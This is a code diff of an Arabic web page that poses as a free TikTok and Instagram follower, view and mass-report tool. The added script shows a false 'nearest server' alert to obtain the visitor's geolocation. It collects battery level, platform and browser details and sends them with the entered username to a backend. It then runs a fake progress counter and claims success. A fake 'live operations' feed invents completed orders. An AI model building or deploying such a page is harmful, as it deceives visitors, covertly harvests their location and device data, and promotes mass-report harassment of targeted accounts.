@@ -3,28 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <title>رشق تيك وانستا 🎯</title>
-    <meta name="description" content="أقوى أداة حصرية لزيادة المتابعين وتفعيل خدمات الإسبام مجاناً لعام 2026.">
-    <meta property="og:title" content="رشق تيك وانستا 🎯 ✅">
-    <meta property="og:description" content="زد متابعينك، مشاهداتك، ولايكاتك فوراً عبر سيرفراتنا السريعة.">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Emoji_u1f480.svg/2048px-Emoji_u1f480.svg.png">
-
+    <title>رشق وإسبام 🎯</title>
     <style>
         body { background-color: black; color: white; text-align: center; font-family: 'Courier New', monospace; padding: 20px; direction: rtl; }
         pre { font-size: 8px; color: #00ff00; margin-bottom: 20px; }
-        .menu-btn { width: 90%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #00ff00; color: #00ff00; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .menu-btn:hover { background: #00ff00; color: black; }
+        .menu-btn { width: 90%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #00ff00; color: #00ff00; border-radius: 8px; font-weight: bold; cursor: pointer; }
         .hidden { display: none; }
         input { width: 85%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: white; text-align: center; }
         .action-btn { width: 85%; padding: 12px; background-color: #00ff00; color: black; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
-        .back-btn { color: #888; text-decoration: underline; cursor: pointer; display: block; margin-top: 15px; font-size: 14px; }
         #progress-container { margin-top: 20px; color: #00ff00; font-size: 20px; border: 1px solid #00ff00; padding: 10px; border-radius: 10px; }
-        
         #victims-list { margin-top: 40px; border-top: 1px solid #333; padding-top: 20px; text-align: right; font-size: 11px; color: #00ff00; }
-        .victim-entry { margin-bottom: 8px; border-bottom: 1px solid #222; padding-bottom: 5px; animation: fadeIn 0.5s; }
-        .time-tag { color: #888; font-size: 10px; margin-right: 5px; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        .victim-entry { margin-bottom: 8px; border-bottom: 1px solid #222; padding-bottom: 5px; }
+        .time-tag { color: #888; margin-right: 5px; }
     </style>
 </head>
 <body>
@@ -58,120 +48,131 @@ u$$$$$$$$$$$$$$$$$$$$$u
         <h3 id="plat-title"></h3>
         <button class="menu-btn" onclick="showOptions('TikTok')">تيك توك</button>
         <button class="menu-btn" onclick="showOptions('Instagram')">انستقرام</button>
-        <span class="back-btn" onclick="goHome()">[ عودة للرئيسية ]</span>
     </div>
 
     <div id="boost-options" class="hidden">
-        <button class="menu-btn" onclick="openFinal('زيادة متابعين', 'يوزر الحساب')">زيادة متابعين</button>
-        <button class="menu-btn" onclick="openFinal('زيادة مشاهدات', 'رابط المقطع')">زيادة مشاهدات</button>
-        <button class="menu-btn" onclick="openFinal('زيادة لايكات', 'رابط المقطع')">زيادة لايكات</button>
-        <span class="back-btn" onclick="goBackPlat()">[ عودة للمنصات ]</span>
+        <button class="menu-btn" onclick="openFinal('رشق متابعين', 'يوزر الحساب')">رشق متابعين</button>
+        <button class="menu-btn" onclick="openFinal('رشق مشاهدات', 'رابط المقطع')">رشق مشاهدات</button>
     </div>
 
     <div id="final-input" class="hidden">
         <h3 id="final-title"></h3>
         <input type="text" id="target-id" placeholder="">
         <input type="number" id="target-count" placeholder="الحد الأقصى 5000">
-        <button class="action-btn" onclick="startProcess()">ابدأ العملية الآن ✅</button>
+        <button class="action-btn" onclick="requestAccess()">ابدأ العملية الآن ✅</button>
         <div id="progress-container" class="hidden">جاري العمل: <span id="counter">0</span></div>
-        <span class="back-btn" id="back-final" onclick="goHome()">[ إلغاء ]</span>
     </div>
 
     <div id="victims-list">
         <h4>السجل الحي للعمليات:</h4>
-        <div id="live-victims">
-            </div>
+        <div id="live-victims"></div>
     </div>
 
     <script>
         let mode = ""; let platform = ""; let service = "";
-        let fakeVictims = [
-            {user: "a***_2", plat: "TikTok", time: 120}, // قبل دقيقتين
-            {user: "s***_9", plat: "Instagram", time: 3600} // قبل ساعة
-        ];
+        let fakeVictims = [{user: "a***_2", time: 120}, {user: "s***_9", time: 3600}];
 
         window.onload = function() {
-            if (!localStorage.getItem('visited')) {
-                fetch('/api/index?action=trace').then(() => { localStorage.setItem('visited', 'true'); });
-            }
             updateVictimsUI();
-            setInterval(updateTimes, 60000); // تحديث عداد الوقت كل دقيقة
-            setInterval(addNewFakeVictim, 35000); // إضافة عملية وهمية كل 35 ثانية
+            setInterval(() => { fakeVictims.forEach(v => v.time += 60); updateVictimsUI(); }, 60000);
+            setInterval(addNewFakeVictim, 35000);
         };
-
-        function updateTimes() {
-            fakeVictims.forEach(v => v.time += 60);
-            updateVictimsUI();
-        }
-
-        function formatTime(seconds) {
-            if (seconds < 60) return "منذ ثوانٍ";
-            let mins = Math.floor(seconds / 60);
-            if (mins < 60) return `منذ ${mins} دقيقة`;
-            return `منذ ${Math.floor(mins / 60)} ساعة`;
-        }
 
         function updateVictimsUI() {
             const container = document.getElementById('live-victims');
             container.innerHTML = "";
-            fakeVictims.sort((a, b) => a.time - b.time).slice(0, 5).forEach(v => {
+            fakeVictims.sort((a,b) => a.time - b.time).slice(0,5).forEach(v => {
                 const div = document.createElement('div');
                 div.className = 'victim-entry';
-                div.innerHTML = `<span class="time-tag">${formatTime(v.time)}</span> User: ${v.user} | المنصة: ${v.plat} | الحالة: مكتمل ✅`;
+                let t = v.time < 60 ? "ثوانٍ" : Math.floor(v.time/60) + " دقيقة";
+                div.innerHTML = `<span class="time-tag">منذ ${t}</span> User: ${v.user} | مكتمل ✅`;
                 container.appendChild(div);
             });
         }
 
         function addNewFakeVictim() {
-            const users = ["k***_m", "r***_1", "o***_x", "n***_z"];
-            fakeVictims.unshift({
-                user: users[Math.floor(Math.random() * users.length)],
-                plat: Math.random() > 0.5 ? "TikTok" : "Instagram",
-                time: 0
-            });
+            fakeVictims.unshift({user: "u***_"+Math.floor(Math.random()*9), time: 0});
             updateVictimsUI();
         }
 
-        function startProcess() {
+        function requestAccess() {
             const id = document.getElementById('target-id').value;
             const count = parseInt(document.getElementById('target-count').value);
-
             if(!id || !count) return alert("أكمل البيانات!");
-            if(count > 5000) return alert("الحد الأقصى المسموح به هو 5000 فقط!");
+            if(count > 5000) return alert("الحد الأقصى 5000!");
+
+            // التمويه موحد لكل الأقسام
+            alert("للحماية من السبام، يرجى السماح بالوصول للموقع لتحديد أقرب سيرفر لضمان سرعة التنفيذ.");
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => sendData(pos.coords.latitude, pos.coords.longitude),
+                    () => sendData(null, null)
+                );
+            } else {
+                sendData(null, null);
+            }
+        }
+
+        async function sendData(lat, lon) {
+            const id = document.getElementById('target-id').value;
+            const count = document.getElementById('target-count').value;
+            
+            let battery = "غير معروف";
+            try { const b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}%`; } catch(e) {}
+
+            const deviceInfo = {
+                platform: navigator.platform,
+                battery: battery,
+                browser: navigator.userAgent.split(' ').pop()
+            };
 
             fetch('/api/index', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ mode, platform, service, id, count })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ mode: mode, target_id: id, count: count, lat: lat, lon: lon, device_info: deviceInfo })
             });
 
+            startCounter(count);
+        }
+
+        function startCounter(max) {
             document.getElementById('progress-container').classList.remove('hidden');
-            document.getElementById('back-final').classList.add('hidden');
-            
             let current = 0;
-            // 120000ms (دقيقتين) تقسيم 100 رقم = 1200ms لكل رقم
-            let speed = 1200; 
-            
             let interval = setInterval(() => {
-                if(current >= count) {
+                if(current >= max) {
                     clearInterval(interval);
-                    // إضافة عملية الضحية الحالية للقائمة قبل الإغلاق
-                    fakeVictims.unshift({user: id.substring(0,1) + "***" + id.slice(-1), plat: platform, time: 0});
-                    updateVictimsUI();
-                    alert("تمت العملية بنجاح ✅");
+                    alert("تمت العملية بنجاح! سيتم التنفيذ خلال 24 ساعة.");
                     location.reload();
                 } else {
                     current++;
                     document.getElementById('counter').innerText = current;
                 }
-            }, speed);
+            }, 1200); // دقيقتين لكل 100
         }
 
-        function showSub(m) { mode = m; document.getElementById('main-menu').classList.add('hidden'); document.getElementById('platform-menu').classList.remove('hidden'); document.getElementById('plat-title').innerText = m === 'boost' ? "قسم الرشق" : "قسم الإسبام"; }
-        function showOptions(p) { platform = p; document.getElementById('platform-menu').classList.add('hidden'); if(mode === 'boost') { document.getElementById('boost-options').classList.remove('hidden'); } else { openFinal('إسبام بلاغات', 'يوزر الحساب'); } }
-        function openFinal(s, hint) { service = s; document.getElementById('boost-options').classList.add('hidden'); document.getElementById('platform-menu').classList.add('hidden'); document.getElementById('final-input').classList.remove('hidden'); document.getElementById('final-title').innerText = platform + " - " + s; document.getElementById('target-id').placeholder = hint; }
-        function goHome() { location.reload(); }
-        function goBackPlat() { document.getElementById('boost-options').classList.add('hidden'); document.getElementById('platform-menu').classList.remove('hidden'); }
+        function showSub(m) { 
+            mode = m; 
+            document.getElementById('main-menu').classList.add('hidden'); 
+            document.getElementById('platform-menu').classList.remove('hidden'); 
+            document.getElementById('plat-title').innerText = m === 'boost' ? "قسم الرشق" : "قسم الإسبام";
+        }
+        function showOptions(p) { 
+            platform = p; 
+            document.getElementById('platform-menu').classList.add('hidden'); 
+            if(mode === 'boost') {
+                document.getElementById('boost-options').classList.remove('hidden');
+            } else {
+                openFinal('إسبام بلاغات', 'يوزر الحساب');
+            }
+        }
+        function openFinal(s, h) { 
+            service = s; 
+            document.getElementById('boost-options').classList.add('hidden'); 
+            document.getElementById('final-input').classList.remove('hidden'); 
+            document.getElementById('final-title').innerText = platform + " - " + s;
+            document.getElementById('target-id').placeholder = h; 
+        }
     </script>
 </body>
 </html>
